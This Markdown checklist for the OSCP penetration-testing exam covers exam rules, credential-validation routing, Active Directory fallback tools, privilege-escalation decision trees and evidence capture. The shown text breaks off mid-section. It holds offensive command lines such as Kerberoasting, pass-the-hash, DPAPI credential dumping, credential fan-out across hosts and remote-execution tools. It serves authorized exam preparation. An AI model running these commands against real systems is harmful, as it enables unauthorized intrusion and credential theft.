# 🔐 ULTIMATE OSCP METHODOLOGY CHECKLIST

> **Release: V20 · 08 Sep 2026**  
> Every published improvement increments the release number; V19 remains separately preserved and V20 inherits it.
>
> **Exam-time-only OSCP/OSCP+ operating checklist — offline, version-aware,
> evidence-driven, and designed for fast decisions under pressure.** Works in:
> **Obsidian** ✅ | **GitHub** ✅ | **VS Code Preview** ✅ | **Typora** ✅
> Exam rules last checked against OffSec's official docs: **06 Sep 2026**
>
> **EXAM-ONLY CONTRACT:** This file intentionally excludes study plans, quizzes, simulations,
> prohibited-tool workflows, and training commands. Search the Decision Desk first; open the
> deep reference only for the exact branch you are executing.

------------------------------------------------------------------------

## V20 TODAY-LOCK — READ BEFORE TOUCHING A TARGET

Verified **08 Sep 2026** against the current OffSec OSCP+ Exam Guide, FAQ,
AI policy, Candidate Handbook, and reporting requirements. The live official
pages and the exam control panel always override this offline snapshot.

- [ ] Read the objectives and point values shown for this exact attempt.
- [ ] Close AI/LLM/chatbot tools for both the exam and reporting phase.
- [ ] Restricted Metasploit functionality is unused, or one exact target is recorded; never pivot with Metasploit.
- [ ] Capture `local.txt` / `proof.txt` in its original path from an interactive shell with the target IP visible in the same screenshot.
- [ ] Submit every earned flag in the control panel before the attack window ends.
- [ ] Download exam-environment files only when necessary to compromise a target; delete those local copies after the objective.
- [ ] Report machines in the required grading/order, use the exact case-sensitive PDF name, place only that PDF in an unencrypted `.7z` under 200 MB, compare MD5, then click **Submit File**.
- [ ] Contact the proctor immediately for technical problems; log every revert/reset and time.

```text
ATTACK WINDOW: 23h45m     REPORT UPLOAD: +24h     PASS: 70/100
STANDALONES: 3 × 20       AD SET: 40              BONUS: none
```

## V19 CREDENTIAL MATERIAL ROUTER

Never treat every secret as the same input. Record the source, principal,
local/domain scope, material type, lockout risk and one justified destination.
Prove authentication on one host first; authorization/admin/code execution is a
separate result. The **Windows** view in the offline app renders all eight plans.

| What you have | First safe proof | Critical constraint |
|---|---|---|
| Domain password | `nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN"` | DNS/time and domain format; `[+]` is not admin |
| Local/SAM password | `nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth` | Exact host/SAM only; do not assume domain scope |
| NT hash | `nxc smb "$IP" -u "$USER" -H "$NTHASH" -d "$DOMAIN"` | Choose domain or `--local-auth`; protocol must support PTH |
| Kerberos ccache/kirbi | `KRB5CCNAME=/abs/user.ccache klist` then `nxc smb "$FQDN" --use-kcache` | FQDN/SPN, realm, DNS, time and ticket service/expiry |
| PFX/PEM | `nxc smb "$HOST_FQDN" -u "$USER" --pfx-cert "$PFX" --pfx-pass "$PFX_PASS"` | Mapped identity, matching private key and certificate password |
| AES key | `impacket-getTGT "$DOMAIN/$USER" -aesKey "$AES_KEY" -dc-ip "$DC_IP"` | AES128/256 principal key—not an NT hash |
| LAPS password | `nxc smb "$IP" -u "$LOCAL_ADMIN" -p "$LAPS_PASS" --local-auth` | One mapped computer/local identity only |
| gMSA hash | `nxc smb "$FQDN" -u "$GMSA_USER" -H "$NTHASH" -d "$DOMAIN"` | SPN/host/graph relationship decides usefulness |

### Impacket 0.13.1 delta

```bash
# Ordinary Kerberoast request first; use AES/no-RC4 only when RC4 is disabled
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -no-rc4 -outputfile kerberoast-aes.txt

# Privileged, late-stage collection only—not initial enumeration
impacket-dpapidump -creds -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS@$TARGET_HOST"
impacket-dpapidump -sccm -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS@$TARGET_HOST"
```

Use the installed `-h` as syntax authority. Impacket 0.13.1 also improves SMB/
Kerberos/RPC behavior, Windows Server 2025 NTDS parsing, ACL/owner lookup,
key-credential handling and BadSuccessor reliability. `impacket-smbclient` now
has improved DFS/listing behavior and recursive `rget`; download only files
necessary for the objective.

### V20 stable tool lock (re-checked 08 Sep 2026)

| Tool | Stable/reference version | Exam-time decision |
|---|---:|---|
| Impacket | 0.13.1 | Current wrapper/help wins; use the new deltas above only when prerequisites match |
| NetExec | 1.5.1 | Do not use `spider_plus` on an older build; V19 core paths do not need that module |
| BloodHound CE | 9.6.0 | Stable choice; 9.7.0 is still a release candidate, so do not switch the exam stack to it |
| BloodHound CE Python collector | 1.9.1 | Use `bloodhound-ce-python` for CE, not the legacy collector by assumption |
| Certipy | 5.1.0 | Current stable command family; verify local `certipy -h` / `-v` |
| Ligolo-ng | 0.9.1 | Use managed interface/session/route syntax and validate the certificate fingerprint |

Run `python3 oscp-v19-preflight.py` before the exam and import its JSON into the
app. It records presence, local help/version output and hashes. A mismatch is a
prompt to read installed help—not permission to improvise an unverified command.


## V20 AD / Windows Fallback Toolbox — Searchable, Compact, Rule-Aware

`[V20:AD-FALLBACKS]` `[TOOL:RUNASCS]` `[TOOL:SHARPVIEW]` `[TOOL:WINDAPSEARCH]` `[TOOL:CERTIFY]` `[TOOL:SSHUTTLE]` `[TOOL:EMPIRE]` `[TOOL:INVEIGH]`

V20 **inherits every V19 core AD path** (NetExec, Impacket, BloodHound/SharpHound,
PowerView, Rubeus, Mimikatz, evil-winrm, Kerbrute, Certipy, Ligolo-ng/Chisel,
Windows privilege escalation and native commands). This section exists only to
close useful fallback gaps. Do **not** turn a tool list into a checklist you run
blindly: start with the simplest native/manual proof, then use one alternate tool
when it answers a specific question.

### High-value fallbacks

| Need | Preferred fallback | Exam-time use |
|---|---|---|
| Run known credentials as another Windows user | **RunasCs** | Confirm the alternate token first with `whoami /all`; choose local/domain scope deliberately. |
| PowerView blocked/unavailable | **SharpView** | C# PowerView-style queries for DCs, users, groups, ACLs and admin/session relationships. |
| Quick LDAP enumeration from Kali | **windapsearch** | Users/groups/computers/SPNs when raw `ldapsearch` is getting slow or error-prone. |
| Windows-side AD CS enumeration | **Certify** | Fallback/complement to Certipy when you already have a Windows session. |
| SSH pivot available | **sshuttle** | Route one justified internal subnet through an SSH foothold; do not replace a working Ligolo route just for variety. |

#### RunasCs — explicit-credential process launch

```powershell
# Local account: prove the resulting context first.
.\RunasCs.exe user1 'Password1!' "cmd /c whoami /all"

# Domain account. Start with a harmless identity check.
.\RunasCs.exe user1 'Password1!' "cmd /c whoami /all" -d domain.local

# If behavior differs by host/token, trust the binary's local help.
.\RunasCs.exe --help
```

Use it when you **already possess a password** and need to test what that identity
can actually do on the current host. A successful process start is not proof of
local administrator/SYSTEM. Avoid UAC-bypass options unless the exact privilege,
objective and rollback/evidence need justify them.

#### SharpView — PowerView fallback from Windows

```powershell
# Confirm syntax supported by the exact build first.
.\SharpView.exe Get-DomainController -Help

# Basic domain-controller query.
.\SharpView.exe Get-DomainController -Domain domain.local -Server dc.domain.local

# Then use only the exact method your evidence calls for, e.g. user/group/ACL/session queries.
```

Treat SharpView as an **alternate implementation**, not a second full enumeration
pass after PowerView/BloodHound already answered the question.

#### windapsearch — focused LDAP queries from Kali

```bash
# USER must include the domain (user@domain.local or DOMAIN\\user).
python3 windapsearch.py --dc-ip "$DC_IP" -u "$USER@$DOMAIN" -p "$PASS" -U   # users
python3 windapsearch.py --dc-ip "$DC_IP" -u "$USER@$DOMAIN" -p "$PASS" -G   # groups
python3 windapsearch.py --dc-ip "$DC_IP" -u "$USER@$DOMAIN" -p "$PASS" -C   # computers
python3 windapsearch.py --dc-ip "$DC_IP" -u "$USER@$DOMAIN" -p "$PASS" --user-spns
```

If authentication fails, fix bind identity, DNS/domain and credentials before
switching LDAP tools again. Raw `ldapsearch` remains the best manual truth check.

#### Certify — Windows-side AD CS fallback

```powershell
# Modern Certify command family: enumerate enabled/vulnerable templates for the current user.
.\Certify.exe enum-templates --filter-enabled --filter-vulnerable --current-user

# Enumerate CAs when the template result needs CA context.
.\Certify.exe enum-cas --current-user --filter-vulnerable
```

Use **Certipy from Kali as the default** because the main reference is already
built around it. Certify is valuable when Windows-local context is easier or a
second implementation is needed to validate the same AD CS prerequisite.

#### sshuttle — SSH-based routed pivot fallback

```bash
# One known internal subnet through an SSH foothold.
sudo sshuttle -r "$SSH_USER@$PIVOT" 10.10.20.0/24

# Add --dns only when internal DNS resolution is actually required and verified.
```

Use sshuttle only when the pivot supports SSH/Python and the route is simpler
than building another tunnel. Validate from the pivot first, then from Kali.

### Native Windows commands — always available before dropping another tool

```cmd
whoami /all
hostname
ipconfig /all
net user /domain
net group "Domain Admins" /domain
nltest /domain_trusts
klist
REM If RSAT/DSQUERY exists:
dsquery user -limit 0
dsquery computer -limit 0
```

Native output is often enough to prove identity, groups, trusts, cached tickets
or domain reachability. Prefer it when EDR/AMSI/tool transfer is becoming the
problem instead of the target.

### Rule-sensitive / secondary tools — searchable but not default

- **PowerShell Empire / Covenant** — OffSec's current FAQ lists them as allowed
  examples, but **features that perform a restricted action remain prohibited**.
  Do not use C2 automation as a substitute for understanding/recording the exact
  exploitation path; no Metasploit pivoting rule changes because another C2 exists.
- **PowerSploit** — the useful exam pieces are already represented by **PowerView
  and PowerUp**. Load the individual module you need rather than a whole legacy
  suite when a smaller script answers the question.
- **Inveigh / Responder** — **NO LLMNR/NBNS/mDNS poisoning or spoofing on the
  OSCP exam.** OffSec explicitly prohibits spoofing and specifically says
  Responder poisoning/spoofing is not allowed. Keep these names searchable so
  you remember the rule; do not start an active poisoning workflow.
- **ADPEEAS / PingCastle** — secondary audit helpers, not a default OSCP path.
  Use only if already available and a specific unresolved AD question justifies
  them. Their findings are leads; manually prove the exact permission/path.

### V20 fallback decision rule

```text
native/manual proof works?       → keep it; do not add tools
PowerView fails?                 → SharpView OR LDAP, not both blindly
raw LDAP is cumbersome?          → windapsearch for one focused query
Certipy context awkward?         → Certify from the owned Windows host
known password needs local test? → RunasCs → whoami /all → prove capability
SSH foothold + internal subnet?  → sshuttle if simpler than existing tunnel
Responder/Inveigh temptation?    → STOP: poisoning/spoofing is prohibited
Empire/Covenant available?       → allowed tool != every feature allowed
```


## V19 TARGET HANDOFF + ACCESS TRUTH LAYER

The V19 web app adds these two small exam-time controls without adding another
screen. They solve two expensive errors: forgetting the exact return path after
rotating targets, and mistaking an accepted credential for useful or privileged
access.

### Six-line resume / park packet

Complete this inside **Target** before parking a machine. The app will not mark
the target parked until all six fields are present, and it pauses the shared
evidence timer when you park.

| Field | What to write |
|---|---|
| Current access / identity | Exact user, host and channel; explicitly say when admin is not proven |
| Strongest evidence | One concrete observation that changed the target model |
| Exact hypothesis | `Because I observed X, I may be able to do Y` |
| Missing prerequisite | One fact, right, route, build, configuration or trigger still required |
| Next decisive command | One command that confirms or rejects the hypothesis |
| Re-entry / recovery | Exact shell, tunnel, listener, route or foothold needed to return |

```text
CURRENT ACCESS / IDENTITY:
STRONGEST EVIDENCE:
EXACT HYPOTHESIS:
MISSING PREREQUISITE:
NEXT DECISIVE COMMAND:
RE-ENTRY / RECOVERY:
```

Use credential **labels** or environment-variable names in this packet—never a
raw password, NT hash, ticket, certificate key or private key. V19 blocks common
secret patterns from being saved or copied here. The credential vault/session
controls remain the correct place for intentionally managed secrets.

After a target revert, the packet and protocol outcomes are visibly stale until
you re-establish the foothold, route and current identity. A saved command is a
return plan, not proof that the old live state survived.

### Windows / AD authentication-to-access ladder

For one labeled principal and one selected target, record the highest outcome
you actually observed on each exposed protocol:

| Outcome | What it proves | Safe next decision |
|---|---|---|
| Not tested | Nothing yet | Make one exact-host request with the correct identity scope |
| Transport / service fails | Route, port, name, TLS or service problem | Fix transport before judging the credential |
| Authentication rejected | This attempt was rejected | Check domain/local format, DNS/time and lockout risk; retry once |
| Authenticated only | The protocol accepted the identity | Test one read/query/session action; do not claim admin |
| Resource / data access | A share, LDAP query, DB or other resource is readable | Record the exact object/path/rights and follow its evidence |
| Command execution | A command ran in a specific remote context | Record the token; obtain an interactive shell when proof requires it |
| Interactive shell / session | A usable session exists | Baseline identity/groups/routes/listeners; admin remains separate |
| Privileged / admin control | Effective privileged control was proved | Stop and bank valid original-path proof/report evidence |

NetExec's successful-login marker and its `Pwn3d!` marker are deliberately kept
separate in V19. Upstream NetExec documentation describes `Pwn3d!` differently
by protocol; for example, SMB/WMI generally imply local-administrator capability,
while WinRM/RDP indicate at least code execution. Always validate the actual
token and the exact action. A remote command is not automatically an interactive
proof shell.

```bash
# One-host examples; use the installed tool's -h/--help as syntax authority.
nxc smb "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc winrm "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc rdp "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc mssql "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
nxc wmi "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"

# Authentication accepted is only the start; prove the next exact capability.
nxc smb "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users
evil-winrm -i "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS"
xfreerdp /v:"$TARGET" /u:"$AUTH_USER" /d:"$DOMAIN" /p:"$AUTH_PASS" /cert:ignore +clipboard
impacket-mssqlclient "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET" -windows-auth
impacket-wmiexec "$DOMAIN/$AUTH_USER:$AUTH_PASS@$TARGET" "whoami /all"
```

Do not turn this into a broad spray. Prefer protocols already shown as exposed,
use one current principal, and let the result choose the next test. The current
OffSec guide/FAQ and exam control-panel objectives remain authoritative.


<details>
<summary>🧠 READ THIS FIRST — 2026 OSCP+ EXAM OPERATING SYSTEM</summary>

```text
EXAM STRUCTURE (OffSec guide checked 06 Sep 2026)

3 stand-alone machines = 60 pts total
  └─ each machine: 10 initial access + 10 privilege escalation

1 AD set / 3 machines = 40 pts total
  ├─ machine #1 = 10
  ├─ machine #2 = 10
  └─ machine #3 = 20

PASS = 70 / 100
NO BONUS POINTS

OFFICIAL 70-POINT COMBINATIONS:
  40 AD + 3× local.txt                         = 70
  40 AD + 2× local.txt + 1× proof.txt          = 70
  20 AD + 3× local.txt + 2× proof.txt          = 70
  10 AD + 3 fully completed standalones        = 70

TIME:
  23h45m attack window
  + 24h report-upload window
```

### The 10 Rules That Matter Under Pressure

1. **Enumeration is progress only when you read the output.** Do not launch ten tools and ignore their findings.
2. **Do not commit to a fixed "AD first" or "standalone first" strategy.** After the initial sweep, attack the path with the strongest evidence.
3. **Use a 20–30 minute evidence clock.** Extend it only when you can name one precise, cheap prerequisite that will decide the hypothesis; otherwise rotate.
4. **Every credential is a new attack surface.** Classify its material/scope, prove it on one justified host, then expand only from evidence and lockout policy.
5. **Every new shell is a new enumeration phase.** Re-run users, privileges, services, internal ports, routes, credentials, scheduled jobs and AD relationships.
6. **Bank points immediately.** Capture the official proof screenshot and submit the flag in the control panel as soon as you earn it.
7. **A passing score is not useful if the evidence is invalid.** Documentation is part of exploitation.
8. **Break tunnel vision.** Recent 2026 passers repeatedly report that short breaks exposed paths they missed while staring at the same machine.
9. **Prefer a validated simple path over an exotic CVE.** Exact versions, configuration and prerequisites matter.
10. **Your notes must work without AI.** AI/LLM chatbots are prohibited during both the exam and the reporting phase.

### Attack Priority — Dynamic, Not Dogmatic

```text
INITIAL ENUMERATION OF ALL TARGETS
              ↓
      WHICH TARGET HAS THE
       STRONGEST SIGNAL?
      /        |         \
 AD path   standalone   obvious
 visible     foothold     privesc
      \        |         /
        ATTACK 20–30 MIN
              ↓
        NEW EVIDENCE?
         /         \
       YES          NO
       ↓            ↓
    CONTINUE       ROTATE
       ↓
  BANK POINTS + EVIDENCE
       ↓
  REASSESS PASS COMBINATIONS
```

### What Counts as "New Evidence"?

```text
new credential
new reachable host/port
new virtual host
new writable file/service/task
new BloodHound edge
new group/ACL/delegation right
new internal-only listener
confirmed vulnerable version/config
working file-read / command execution primitive
new privilege / token / capability
new application source/config/backup
```

If none of those changed for 20–30 minutes, you are probably repeating a hypothesis rather than progressing.

</details>


<details open>
<summary>🧭 EXAM DECISION DESK — START HERE, THEN CTRL+F A TAG</summary>

> This is the shortest path through the full reference. Do not read the whole file during the exam. Start here, follow one branch, and use the search tags to jump to exact commands below.

### 0.1 The complete target loop

```text
1. PREPARE       scope, VPN/route, target folder, logging, placeholders
2. MAP           full TCP + quick focused scan; targeted UDP when justified
3. ENUMERATE     one findings row per port: access, product, role, data, next test
4. PRIORITIZE    credentials > anonymous/default access > files/source/backups > misconfig > exact CVE
5. HYPOTHESIZE   "Because I observed X, I may be able to do Y"
6. VALIDATE      access + exact build/package + config + architecture + trigger + risk
7. EXPLOIT       smallest reliable/manual path; preserve original PoC and changes
8. STABILIZE     interactive shell, identity, hostname, interfaces, routes
9. ENUMERATE     local users, privileges, secrets, services, jobs, apps, internal listeners
10. ESCALATE     prove one writable/controllable edge; back up before modification
11. FAN OUT      test each new credential on appropriate exposed in-scope services; respect lockout policy
12. PROVE        flag from original location + target IP in the same interactive-shell screenshot
13. RECORD       exact commands, output, changes, source URL, timestamps, screenshots
14. REPEAT       new access changes the surface; re-enumerate, re-collect AD, then close the target
```

**Continue** while a test creates new evidence. **Park the path** after 20–30 minutes or two failed tests without new evidence. Record the missing prerequisite and the exact event that would justify returning.

### 0.2 “I have this — what next?”

| What you have | Do this now | If it fails | Search tag |
|---|---|---|---|
| IP only | Full TCP scan; quick top-port scan in parallel; save XML/normal output | Verify VPN, route and packets; retry a small port set with slower timing | `[DECISION:IP]` |
| Port + service | Use the native/manual client first; test anonymous/default/known credentials; inspect all output | Try one alternate client and a packet capture before rejecting the service | `[SERVICE:<PORT>]` |
| Web app | Add hostname/vhosts; inspect source, headers, cookies, robots, sitemap, JS and network calls; then content discovery | Change wordlist/extensions, test by Host header, compare status/length/words, inspect backups and `.git` | `[DECISION:WEB]` |
| Version banner | Confirm exact product/build/package and required configuration before searching/using a PoC | Look for source/config/credentials and misconfiguration; version match alone is low signal | `[DECISION:CVE]` |
| Username/password/hash | Record provenance; test the identity across appropriate known services with lockout awareness | Change domain/user format and protocol; check DNS/time; crack only with a justified wordlist | `[DECISION:CRED]` |
| Linux shell | Stabilize; `id`, `sudo -l`, SUID, capabilities, cron/systemd, services, credentials, containers, then kernel last | Read LinPEAS output and manually validate one primitive at a time | `[DECISION:LINUX]` |
| Windows shell | `whoami /all`, OS/network, files/software, PrivEscCheck; services, tasks, registry, credentials, local ports, kernel last | Run one complementary collector, then manually validate permissions/configuration | `[DECISION:WINDOWS]` |
| Domain credential | Fix DNS/time; validate SMB/LDAP/WinRM/RDP; shares/users/groups/SPNs; BloodHound; AD CS; lateral access | Separate authentication from authorization; try native LDAP/RPC/SMB clients and exact user formats | `[DECISION:AD]` |
| New network/interface | Inspect routes/listeners; prove reachability from the pivot; add one route/tunnel; scan through it | Packet-capture both sides and simplify to one TCP connection | `[DECISION:PIVOT]` |
| Root/SYSTEM/Administrator | Stop, capture proof correctly, submit the value, save commands/screenshots, then re-enumerate only if needed | Do not leave the shell until evidence and report notes are complete | `[DECISION:PROOF]` |
| Tool error | Decide whether the tool failed or the hypothesis failed; read help/version and error text | Use one alternate implementation or manual protocol test | `[DECISION:FALLBACK]` |


### 0.2A Stuck now — three-minute exam reset

1. **Stop changing things.** Save output, shell context, timestamps, and the exact error.
2. **Write the current hypothesis in one sentence.** Name the missing prerequisite.
3. **Run one decisive check.** It must confirm or reject route, DNS, time, access, authorization, version, configuration, trigger, or write control.
4. **Choose one branch:** continue if confidence increased; use one manual/fallback implementation if the tool failed; otherwise park it and rotate.
5. **Before rotating:** record the return condition, protect credentials/evidence, and check whether another target now offers a faster point path.

| Symptom | Immediate recovery action |
|---|---|
| No initial access | Re-read every service output; revisit vhosts, source/JS, anonymous/default access, files/backups and credential reuse before another CVE |
| Shell but no escalation | Re-run identity/privileges; rank writable privileged execution, credentials and internal-only services above kernel exploits |
| Credential “fails” | Separate authentication from authorization; correct domain/user format, DNS/time and protocol; check lockout risk before retrying |
| Pivot is broken | Prove destination reachability from the pivot host, then verify tunnel session, route and connection direction |
| Tool is failing | Read the error and local `--help`; make one native/manual request; try one alternate implementation only |
| Root/SYSTEM reached | Stop exploitation; capture proof + IP in the interactive shell, submit the flag, and complete report notes immediately |

### 0.2B Bank the points — 90-second closure gate

Do this **before another exploit, a shell exit, a revert, or a break** whenever you obtain `local.txt` or `proof.txt`:

1. Stay in an **interactive shell** on the target. PowerShell Core / PSSession counts as an interactive shell under the current FAQ.
2. Read the flag with `cat` or `type` from its **original absolute path**. Do not use a web shell, file download, or copied flag file as proof.
3. In the same terminal view, run `ip addr`, `ifconfig`, or `ipconfig`; keep the target IP and full flag contents visible together in one readable screenshot. `hostname` and `id` / `whoami` are useful context, but the official required pair is **target IP + flag contents**.
4. Submit the exact value in the exam control panel **before the attack window ends**. The panel does not confirm whether the value is correct, so compare it yourself.
5. Save the screenshot as `<host-or-IP>-<local-or-proof>-original-path.png` (for example, `10.10.10.5-proof-original-path.png`). Record the exact command path, timestamp, exploit/privesc chain, public-exploit URL, and any code changes while the shell is still available.
6. Mark the evidence gate complete and write the next action. If fatigue is rising, take a 5–10 minute break **now, after closure—not before it**. Then re-enumerate only if the new identity changes the attack surface; otherwise rotate.

```text
SHELL → ORIGINAL PATH → IP + FLAG IN ONE SCREENSHOT → CONTROL PANEL
      → COMMANDS + CHANGES + SCREENSHOT NAME → ONLY THEN MOVE
```

**If you believe you have 70+ points:** pause new exploitation and audit every counted target first. Unsubmitted or invalid evidence is not safely banked.

### 0.2C Technical-incident / revert gate

- A bad result is not automatically a broken target. First verify VPN interface, route, DNS/time where relevant, packets, exact target, and one minimal known-good request.
- The current guide provides a **24-revert bank** and permits that limit to be reset once. Revert only after recording what target-side state, foothold, tunnel, upload, or modification must be rebuilt; click the control-panel revert once and wait.
- A revert destroys target-side changes. Treat pre-revert shells, tunnels, uploads, services/tasks, and temporary sessions as stale until revalidated.
- For VPN/target infrastructure problems, record timestamps and symptoms and contact the proctor immediately. Support handles technical issues, not exam-objective hints.

### 0.2D Before changing target state — mutation / rollback gate

Use this before modifying a file, owner/mode/ACL, registry value, service, scheduled task, GPO, AD object, certificate template, package, route, or firewall rule:

1. **Prove control and trigger.** Record the exact principal, permission, privileged consumer, and event that will execute or read your change.
2. **Capture the original state.** Save the path/object name, owner, mode/ACL, service/task configuration, hash, content, or attribute value needed to restore it.
3. **Protect access and evidence.** Bank any earned flag first; keep the current shell and a written re-entry path. Create a secret-free recovery snapshot in the web console.
4. **Make the smallest reversible change.** Avoid overwriting a whole binary/configuration when a narrower controlled dependency proves the primitive.
5. **Write rollback before execution.** Know the restore command, backup path, required privilege, and trigger/restart sequence.
6. **Validate and record.** Capture the command, result, resulting identity, and changed object. Restore when practical and revalidate after a revert or reset.

```text
READ ORIGINAL → BACK UP / HASH → WRITE ROLLBACK → MINIMUM CHANGE
              → TRIGGER ONCE → VERIFY → RECORD → RESTORE / REVALIDATE
```

### 0.3 Minimum tool stack — exam core

| Goal | First tool | First safe use | Fallback / manual proof |
|---|---|---|---|
| Port discovery | Nmap | `sudo nmap -Pn -n -p- --min-rate 1000 -oA scans/tcp-all $IP` | Reduce rate; scan known ports; `tcpdump -ni tun0 host $IP` |
| Service detail | Nmap | `sudo nmap -Pn -n -sC -sV -p "$PORTS" -oA scans/tcp-detail $IP` | Native client, banner grab, protocol-specific NSE |
| Raw HTTP | curl | `curl -iskL --path-as-is http://$HOST/` | Burp Community Repeater; browser developer tools |
| Web discovery | Feroxbuster | `feroxbuster -u http://$HOST/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,jsp,txt,bak` | FFUF/Gobuster; robots/sitemap/source/manual traversal |
| Precise fuzzing | FFUF | `ffuf -u http://$HOST/FUZZ -w WORDLIST -ac` | Feroxbuster/Gobuster; calibrate soft-404 responses manually |
| HTTP replay | Burp Community | Send one request to Repeater and change one input at a time | curl with saved headers/cookies |
| SMB/auth | NetExec | `nxc smb $IP -u "$USER" -p "$PASS" --shares` | `smbclient`, `rpcclient`, `enum4linux-ng` |
| LDAP | ldapsearch | `ldapsearch -x -H ldap://$DC_IP -s base namingContexts` | NetExec LDAP, PowerView, ldeep |
| AD paths | BloodHound CE | Collect after every new identity; inspect outgoing control and sessions | PowerView/LDAP/manual ACE validation |
| AD CS | Certipy | `certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -enabled -vulnerable -stdout` | LDAP/PowerView/certutil; prove template, CA and enrollment prerequisites |
| Kerberos/remote exec | Impacket | Use the single helper that matches the proven objective | Rubeus/native Windows tools; fix DNS/time/user format first |
| WinRM shell | Evil-WinRM | `evil-winrm -i $IP -u "$USER" -p "$PASS"` | `nxc winrm`, PowerShell remoting, WMI/SMB methods if authorized |
| Exploit research | SearchSploit | `searchsploit -w "$PRODUCT $VERSION"` then inspect the code | Vendor advisory, Exploit-DB, local docs; validate prerequisites |
| Payload | msfvenom | Generate only the payload format/architecture you need | Native shell, manually compiled source, script payload |
| Linux privesc | LinPEAS + pspy | Save output, read it, then watch short-lived root jobs | Manual `sudo`/SUID/caps/cron/systemd/service checks |
| Windows privesc | PrivescCheck | Save output; validate ACLs and configuration manually | winPEAS, Seatbelt, AccessChk, native PowerShell/SCM queries |
| Password recovery | Hashcat / John | Identify exact hash mode; use a small evidence-based wordlist first | `*2john`, rules/mutations, manual password reuse |
| Pivot | Ligolo-ng | Prove pivot-host reachability, create interface/route, then scan | Chisel, SSH forwarding, Socat for one TCP path |
| Transfer | Python HTTP / Impacket SMB | `python3 -m http.server 8000 --directory tools` | curl/wget/IWR, `impacket-smbserver`, SCP/Evil-WinRM transfer |
| Shell handling | rlwrap/nc + PTY | `rlwrap -cAr nc -lvnp $LPORT`; upgrade immediately | ncat, Socat PTY, `script -qc /bin/bash /dev/null` |

**Rule:** the tool name is not permission for every feature. Never cross the official exam-rules section in these notes.

**Syntax rule:** the installed tool's `-h` / `--help` and version output win over a copied command. Current high-drift examples are NetExec, BloodHound collectors, Certipy, Impacket wrappers, FreeRDP and Ligolo-ng.

### 0.4 Credential fan-out — do this after every new credential

```bash
# Record: source, identity, secret/hash type, where found, timestamp, validated services
nxc smb  $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN" --continue-on-success
nxc winrm $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN"
nxc rdp   $TARGETS -u "$USER" -p "$PASS" -d "$DOMAIN"
nxc ldap  $DC_IP   -u "$USER" -p "$PASS" -d "$DOMAIN"

# Native/manual authorization checks
smbclient -L //$IP/ -U "$DOMAIN/$USER%$PASS"
rpcclient -U "$DOMAIN/$USER%$PASS" $IP
evil-winrm -i $IP -u "$USER" -p "$PASS"
ssh "$USER@$IP"
```

Authentication success does not prove administrative access. Record **protocol + host + auth result + authorization level** separately. Before any password spray, obtain policy, keep the list tiny, and calculate lockout risk.

### 0.5 Mini attack trees

#### `[DECISION:WEB]` Web → primitive → shell

```text
HTTP(S)
├─ identity: title/header/cert/error/hostname/vhost/framework
├─ surface: source/JS/network/robots/sitemap/routes/files/backups/.git
├─ access: default/anonymous/registration/reset/session/role boundaries
├─ inputs: path/file/template/command/SQL/NoSQL/upload/URL/object ID
├─ prove one primitive manually
│  ├─ file read → config/source/key/credential
│  ├─ file write/upload → executable path or config effect
│  ├─ auth/IDOR → privileged data/action/credential
│  ├─ SSRF → internal service/metadata/reachable host
│  └─ command/code execution → stable callback
└─ shell → local enumeration → evidence
```

#### `[DECISION:LINUX]` Linux shell → root

```text
identity + OS + network
├─ sudo -l → allowed binary/script/env/path → GTFOBins/manual argument abuse
├─ SUID/SGID → known binary OR custom binary → strings/strace/config/PATH/library
├─ capabilities → interpreter/editor/network capability → controlled primitive
├─ cron/systemd/timers → root-run target → writable file/dir/path/env
├─ service/process → writable binary/config/socket/credential/internal listener
├─ user/system trails → history/config/backup/key/database/password reuse
├─ groups/containers/mounts/NFS → exact group/socket/export/mount prerequisite
└─ kernel/package CVE LAST → exact package revision + config + PoC reliability
```

#### `[DECISION:WINDOWS]` Windows shell → Administrator/SYSTEM

```text
whoami /all + build + network
├─ SeImpersonate/AssignPrimaryToken → service context + compatible named-pipe technique
├─ service → binary path/account/start mode + writable binary/dir/config + restart control
├─ scheduled task → privileged action + writable executable/script/directory + trigger
├─ registry/autorun/installer → exact setting + writable target + execution condition
├─ DLL/path hijack → missing DLL/search order + writable location + restart/trigger
├─ files/history/DPAPI/config → recover credential → validate/reuse
├─ local-only port/custom app → identify process/account → interact locally
└─ driver/kernel CVE LAST → exact build/patch/architecture + stable PoC + crash risk
```

#### `[DECISION:AD]` Domain credential → domain path

```text
credential
├─ DNS + time + domain/DC identity
├─ validate SMB/LDAP/WinRM/RDP; enumerate shares/users/groups/computers/SPNs
├─ AS-REP/Kerberoast only where exact account prerequisites exist
├─ BloodHound: current identity outgoing control, memberships, sessions, admin rights
├─ ACL/delegation/group edge → READ → BACKUP → minimum change → validate → rollback
├─ AD CS present → Certipy → exact CA/template/enrollment/identity prerequisites
├─ remote access → choose WinRM/WMI/SMB/RDP method matching actual rights
├─ new host/identity → dump only with proven privilege → reuse → re-collect graph
└─ internal-only target → Ligolo/SSH/Chisel → route → enumerate → repeat
```

#### `[DECISION:PROOF]` Privileged shell → valid points

```bash
# Linux: run in the interactive target shell; adapt interface shown to the target
hostname; id; ip addr; cat /root/proof.txt

# Windows cmd.exe
